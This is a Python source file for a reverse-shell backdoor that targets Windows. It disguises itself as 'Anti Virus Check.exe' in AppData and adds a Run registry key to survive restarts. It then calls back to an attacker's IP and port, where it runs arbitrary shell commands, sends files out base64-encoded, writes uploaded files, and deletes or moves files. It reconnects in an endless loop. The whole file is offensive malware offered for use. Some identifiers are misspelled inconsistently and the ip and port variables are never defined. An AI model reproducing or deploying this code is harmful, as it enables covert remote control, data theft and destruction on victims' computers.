# coding reverse backdoor in python 
# the main function is to let the user try to connect to us instead to we trying to coonnect to user

# ------------------------------- start of code -----------------------------

import os
import sys
import json
import socket
import base64
import shutil
import subprocess

class Suspicious:
    def __init__(self, ip, port):
        self.restart_control()
        self.connetion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
    
    def restart_control(self):
        piece_of_cake = os.environ['appdata'] + "\\Anti Virus Check.exe"
        if not os.path.exists(piece_of_cake):
            shutil.copy(sys.executable, piece_of_cake)
            subprocess.call(f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "{piece_of_cake}"', shell=True)

    def handleErrorDataSendType(self, error):
        return str(error)

    def execute_system_commands(self, command):
        # the output data type of the check_output method is byte
        try:
            command = " ".join(command)
            return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode('utf-8')
        except Exception as error:
            return self.handleErrorDataSendType(error)
            # return "------- [=] Error while executing the command [=] ------"

    def changeWorkingDirectory(self, path):
        os.chdir(path)
        return "[+] Changed current working folder to " + str(path)

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def download_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return "[+] File upload success"

    def receive_data(self):
        json_data = ""
        while True:
            try:
                json_data += self.connetion.recv(1024).decode('utf-8')
                return json.loads(json_data)
            except ValueError:
                continue

    def send_data(self, data):
        json_data = json.dumps(data)
        self.connetion.send(json_data.encode('utf-8'))
    
    def getSystemInfo(self):
        platform = {'aix': 'AIX', 'linux':"Linux", 'win32': 'Windows', 'cygwin': 'Windows/Cygwin', 'darwin': 'macOs'}
        return f"[+] Connected to \"{platform[sys.platform]}\" operating system"
    
    def delete_from_system(self, path):
        try:
            if os.path.isdir(path):
                shutil.rmtree(path)
                return "[==] Folder delete successful"
            elif os.path.isfile(path):
                os.remove(path)
                return "[==] file delete successfull"
        except Exception as error:
            return self.handleErrorDataSendType(error)
    
    def move_files_within(self, src, dst):
        try:
            if os.path.isdir(dst):
                shutil.move(src, dst)
                return f"[==] folder moved to \"{dst}\" location"
            else:
                num = 0
                while True:
                    if not os.path.exists(dst):
                        shutil.move(src, dst)
                        break
                    dst = dst + "-" + str(num)
                    num+=1
                return f"[==] folder moved to \"{dst}\" location"
        except Exception as error:
            return self.handleErrorDataSendType(error)

    def start(self):
        while True:
            try:
                data_received = self.receive_data()
                if data_received[0].lower() == 'exit':
                    break
                    # self.connetion.close()
                    # sys.exit()
                elif data_received[0] == 'what':
                    command_result = self.getSystemInfo()
                elif data_received[0].lower() == 'cd' and len(data_received) >1:
                    command_result = self.changeWorkingDirectory(data_received[1])
                elif data_received[0].lower() == 'download':
                    command_result = self.read_file(data_received[1]).decode()
                elif data_received[0].lower() == 'upload':
                    command_result = self.download_file(data_received[-2], data_received[-1])
                elif data_received[0] == 'delete':
                    command_result = self.delete_from_system(data_received[1])
                elif data_received[0] == 'move-within':
                    command_result = self.move_files_within(data_received[1], data_received[2])
                else:
                    command_result = self.execute_system_commands(data_received)
                self.send_data(command_result)
            # except subprocess.CalledProcessError as error:
                # self.send_data("-------[=] Error => subprocess.CalledProcessError [=] -------")
            except Exception as error:
                self.send_data(str(error))
                self.send_data("---- [=] Error while executing command [=] ----")
                # self.send_data("---- [=] Connection is still intact though [=] ----")

# these ip and port values are of hackers system values
while True:
    try:
        backdoor = Suspicious(ip, port)
        backdoor.start()
    except:
        continue